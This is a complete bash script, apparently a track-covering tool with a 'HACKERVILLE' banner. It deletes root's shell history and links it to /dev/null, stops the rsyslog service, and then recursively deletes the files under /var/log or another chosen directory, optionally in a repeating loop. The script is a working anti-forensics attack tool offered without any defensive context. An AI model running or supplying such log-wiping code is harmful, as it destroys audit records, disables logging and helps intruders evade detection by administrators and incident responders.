#!/bin/bash

function log() {
	if [[ "$LOG" == "1" ]]; then
		if (($# > 0 )); then
			echo -e "$@"
		fi
	fi
}

function echoerr() {
	echo "$@" 1>&2; 
}

function remove_files_from_directory() {
	if (($# < 1)); then
		echo "Error, need directory"
		return
	fi
	Files=`ls $1`
	Dir=$1
	for file in $Files; do
		if [[ -d "$1/$file" ]]; then
			log  "$1/$file is a directory, clearing it"
			remove_files_from_directory "$1/$file"
		elif [[ -h "$1/$file" ]]; then
			log "$1/$file is symlink, don't touch this"
		else
			log "$1/$file is file, remove it"
			rm "$1/$file"
		fi
	done
}

if [[ -z "$CLEAR_DIR" ]]; then
	CLEAR_DIR="/var/log"
fi

if [[ -z "$DELAY_TIME" ]]; then
	DELAY_TIME="0"
fi

log ""

log '.%%..%%...%%%%....%%%%...%%..%%..%%%%%%..%%%%%...%%..%%..%%%%%%..%%......%%......%%%%%%.
.%%..%%..%%..%%..%%..%%..%%.%%...%%......%%..%%..%%..%%....%%....%%......%%......%%.....
.%%%%%%..%%%%%%..%%......%%%%....%%%%....%%%%%...%%..%%....%%....%%......%%......%%%%...
.%%..%%..%%..%%..%%..%%..%%.%%...%%......%%..%%...%%%%.....%%....%%......%%......%%.....
.%%..%%..%%..%%...%%%%...%%..%%..%%%%%%..%%..%%....%%....%%%%%%..%%%%%%..%%%%%%..%%%%%%.
........................................................................................'

log ""

log "Set HOME directory to $HOME"
log "Logging set to 1"
log "CLEAR_DIR = $CLEAR_DIR"
log "DELAY_TIME = $DELAY_TIME"

log ""

rm /root/.bash_history
ln -s /dev/null /root/.bash_history
log "Link bash history to /dev/null"

service rsyslog stop
log "Rsyslog was stopped"

log "Delete log: "

while true; do
	remove_files_from_directory "$CLEAR_DIR"
	if [[ "$DELAY_TIME" == "0" ]]; then
		break
	fi
	log "Sleep for $DELAY_TIME"
	sleep $DELAY_TIME
done
